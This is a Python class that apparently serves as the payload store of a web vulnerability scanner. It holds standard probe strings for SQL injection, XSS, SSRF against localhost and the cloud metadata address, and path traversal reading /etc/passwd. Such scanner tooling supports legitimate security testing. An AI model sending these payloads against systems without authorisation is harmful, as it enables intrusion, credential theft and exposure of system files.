from typing import List

class PayloadEngine:
    """
    Centralized payload management system.
    """
    def __init__(self):
        self.payloads = {
            "sqli_error": [
                "'", "\"", "\\", "')", "\")", "`;"
            ],
            "sqli_boolean": [
                " AND 1=1", " AND 1=2", "' OR '1'='1", "' OR '1'='2"
            ],
            "xss_basic": [
                "<script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "javascript:alert(1)//"
            ],
            "ssrf_basic": [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/"
            ],
            "lfi_basic": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "file:///etc/passwd"
            ]
        }

    def get_payloads(self, category: str) -> List[str]:
        return self.payloads.get(category, [])

    def add_custom_payload(self, category: str, payload: str):
        if category not in self.payloads:
            self.payloads[category] = []
        self.payloads[category].append(payload)
